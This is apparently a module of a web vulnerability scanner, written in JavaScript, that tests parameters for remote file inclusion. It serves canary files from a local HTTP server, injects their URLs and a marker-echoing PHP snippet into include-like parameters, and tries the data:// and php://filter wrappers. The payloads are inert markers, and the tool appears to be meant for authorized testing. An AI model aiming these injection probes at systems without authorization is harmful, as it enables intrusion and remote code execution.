// Dark Matter rule-based scanner — remote file inclusion probe (#46).
//
// NON-OVERLAP: traversal.js owns LOCAL inclusion (../../etc/passwd — zero
// remote URLs); ssrf.js owns URL-FETCH sinks. This spec owns REMOTE
// inclusion: the include sink fetches AND/OR executes a scanner-controlled URL.
//   D1. Include-sink inventory: page/file/lang/template/view/content/path/
//       inc/src/load/location params + .php/.inc values + ../ smell.
//   D2. Canary issuance: per-run RUNID; the probe spins a tiny canary HTTP
//       server on the backend host and serves `dm_rfi_<RUNID>.txt` with an
//       inert marker line (plain text — NO weaponization; proof is inclusion).
//       Lab targets (same box) reach it via 172.17.0.1; non-lab via
//       opts.canaryBase (configurable); absent -> D3/D4 degrade honestly.
//   D3. Fetch test — HIGH: response contains `DM_RFI_CANARY_<RUNID>` OR the
//       canary listener logged an inbound GET from the target (fetch proof).
//   D4. Execution test — CRITICAL (PHP targets, only when D3 confirmed):
//       `<?php echo "DM_RFIEXEC_<RUNID>"; ?>`; CONFIRMED only if the marker
//       appears WITHOUT the <?php source (raw source = fetch-only, HIGH).
//   D5. Wrapper variants — MEDIUM (lab-first, PHP): data://, php://filter.
//
// Proof: unique-per-run canary in response or listener log. "failed to open
// stream" = NEGATIVE (blocked), never a finding. Dedupe (target,param,rfi).

import http from 'node:http';
import { isLabTargetHost } from '../../labCreds.js';
import { mutateUrl, probePointName, probePointParameter, probePointKind, isPathPoint } from '../probePoints.js';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

function ev(request, response, impact) {
  return { request, response, impact_demo: impact, signalCorrelated: true };
}

const INCLUDE_PARAMS = /^(page|file|lang|language|template|theme|view|content|path|inc|include|src|load|location|doc|name|docname|article)$/i;

// Spin a canary server on the backend host. Resolves the public canary base
// URL the TARGET can reach (lab: 172.17.0.1 from inside lab containers;
// non-lab: opts.canaryBase). Returns { base, hits, close }.
async function startCanaryServer(rid, opts) {
  const canary = `DM_RFI_CANARY_${rid}`;
  const execCanary = `DM_RFIEXEC_${rid}`;
  const hits = [];
  const server = http.createServer((req, res) => {
    hits.push({ path: req.url, ip: req.socket.remoteAddress, at: Date.now() });
    if (req.url === `/dm_rfi_${rid}.txt`) {
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(`${canary}\n`);
    } else if (req.url === `/dm_rfiexe_${rid}.txt`) {
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(`<?php echo "${execCanary}"; ?>\n`);
    } else {
      res.writeHead(404);
      res.end('nope');
    }
  });
  await new Promise((resolve, reject) => {
    server.on('error', reject);
    server.listen(0, '0.0.0.0', resolve);
  });
  const port = server.address().port;
  let base;
  if (opts.canaryBase) base = opts.canaryBase.replace(/\/$/, '');
  else base = `http://172.17.0.1:${port}`; // lab-reachable host IP on EC2
  return { base, hits, close: () => server.close(), canary, execCanary, rid };
}

async function getText(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 20000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA }, redirect: 'manual' });
    const text = await res.text().catch(() => '');
    return { status: res.status, text: text.slice(0, 500000) };
  } catch {
    return null;
  } finally {
    clearTimeout(t);
  }
}

// ---- D1: include-sink inventory ----------------------------------------------------------------
function includeSmellParams(url, params) {
  const out = [];
  let u;
  try {
    u = new URL(url);
  } catch {
    return out;
  }
  // Points plus the URL's own query keys, deduped by kind:name — a
  // query point and its bare-name twin are the same parameter.
  const seen = new Set();
  const all = [...(params || []), ...[...u.searchParams.keys()].map((n) => ({ kind: 'query', name: n }))];
  for (const p of all) {
    const key = `${probePointKind(p)}:${probePointName(p)}`;
    if (seen.has(key)) continue;
    seen.add(key);
    if (INCLUDE_PARAMS.test(probePointName(p))) {
      out.push(p);
      continue;
    }
    const v = isPathPoint(p)
      ? u.pathname.split('/')[Number(p.segment)] || ''
      : u.searchParams.get(probePointName(p)) || '';
    if (/\.(php|inc|txt|html?)$/i.test(v) || /\.\.\//.test(v)) out.push(p);
  }
  return out;
}

export async function probeRfi(url, params, opts = {}) {
  const findings = [];
  const targets = includeSmellParams(url, params);
  if (!targets.length) return findings; // no include smell — INFO, not a miss
  const rid = rand();
  const lab = isLabTargetHost(url, opts.labTargets);
  let canarySrv = null;
  try {
    canarySrv = await startCanaryServer(rid, opts).catch(() => null);
    if (!canarySrv) return findings;
    const { base, hits, canary, execCanary } = canarySrv;
    const canaryUrl = `${base}/dm_rfi_${rid}.txt`;
    const execUrl = `${base}/dm_rfiexe_${rid}.txt`;
    for (const p of targets.slice(0, 6)) {
      // D3: fetch test.
      const r = await getText(mutateUrl(url, p, canaryUrl), opts);
      await new Promise((res) => setTimeout(res, 1500)); // listener window
      const contentProof = r && r.text.includes(canary);
      const fetchProof = hits.some((h) => h.path === `/dm_rfi_${rid}.txt`);
      const blocked = r && /failed to open stream|URL file-access is disabled|allow_url_include/i.test(r.text);
      if (blocked && !contentProof && !fetchProof) continue; // negative — blocked
      if (contentProof || fetchProof) {
        const cIdx = contentProof ? r.text.indexOf(canary) : -1;
        const cWindow = cIdx >= 0 ? r.text.slice(Math.max(0, cIdx - 60), cIdx + 120) : '';
        findings.push({
          class: 'rfi',
          id: `rfi-fetch-${rand()}`,
          title: 'Remote file inclusion — server fetched scanner canary (HIGH)',
          severity: 'high',
          url,
          parameter: probePointParameter(p),
          evidence: ev(
            `GET ${mutateUrl(url, p, canaryUrl)}`,
            contentProof
              ? `Response contains the literal canary — "...${cWindow}..." — server fetched AND reflected our file.`
              : `Canary listener logged an inbound GET for /dm_rfi_${rid}.txt from the target — fetch proof even without reflection.`,
            'RFI primitive: include sink reaches attacker-controlled URLs.'
          ),
        });
        // D4: execution test (PHP, only when D3 confirmed).
        const r2 = await getText(mutateUrl(url, p, execUrl), opts);
        if (r2 && r2.text.includes(execCanary) && !r2.text.includes('<?php')) {
          findings.push({
            class: 'rfi',
            id: `rfi-exec-${rand()}`,
            title: 'Remote file inclusion — remote PHP EXECUTED (CRITICAL)',
            severity: 'critical',
            url,
            parameter: probePointParameter(p),
            evidence: ev(
              `GET ${mutateUrl(url, p, execUrl)}`,
              `Marker "${execCanary}" in response WITHOUT the <?php source — verbatim proof the remote file was EXECUTED server-side.`,
              'Remote code execution via RFI.'
            ),
          });
        }
      } else if (lab) {
        // D5: wrapper variants (lab-first, PHP).
        for (const wrap of [
          `data://text/plain,${canary}`,
          `php://filter/convert.base64-encode/resource=${canaryUrl}`,
        ]) {
          const rw = await getText(mutateUrl(url, p, wrap), opts);
          if (rw && (rw.text.includes(canary) || /RFBJX1JGSV9DQU5BUlk/.test(rw.text))) {
            const marker = rw.text.includes(canary) ? canary : 'RFBJX1JGSV9DQU5BUlk';
            const idx = rw.text.indexOf(marker);
            const window = idx >= 0 ? rw.text.slice(Math.max(0, idx - 60), idx + 120) : rw.text.slice(0, 200);
            findings.push({
              class: 'rfi',
              id: `rfi-wrap-${rand()}`,
              title: 'Remote file inclusion — PHP wrapper variant confirmed (MEDIUM)',
              severity: 'medium',
              url,
              parameter: probePointParameter(p),
              evidence: ev(
                `GET ${mutateUrl(url, p, wrap).slice(0, 160)}...`,
                `Canary (or its base64) reflected via PHP wrapper — "...${window}..."`,
                'Wrapper-based RFI primitive.'
              ),
            });
            break;
          }
        }
      }
      if (findings.some((f) => f.severity === 'critical')) break;
    }
  } finally {
    if (canarySrv) canarySrv.close();
  }
  return findings;
}

export const __rfiMeta = { phases: ['rfi'], depth: ['quick', 'standard', 'deep'] };
